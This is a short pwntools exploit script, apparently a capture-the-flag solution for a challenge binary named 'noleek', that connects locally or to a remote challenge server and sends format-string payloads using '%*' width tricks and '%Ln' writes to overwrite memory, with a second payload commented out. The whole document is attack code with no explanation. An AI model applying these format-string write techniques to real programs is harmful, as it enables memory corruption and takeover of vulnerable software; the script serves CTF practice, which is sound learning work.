#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("noleek_patched")
libc = elf.libc

local = True 
if local:
    p = process("./noleek_patched")
    gdb.attach(p,'''b*main+145\nc''')
else:
    p = remote('challs.actf.co', 31400)

elf = context.binary = ELF('./noleek_patched', checksec=False)

payload = b'%56c%*1$c%13$Ln'

p.sendlineafter(b'leek? ', payload)

payload = b'%678166c%*12$c%42$Ln'

#p.sendlineafter(b'more leek? ', payload)

p.interactive()

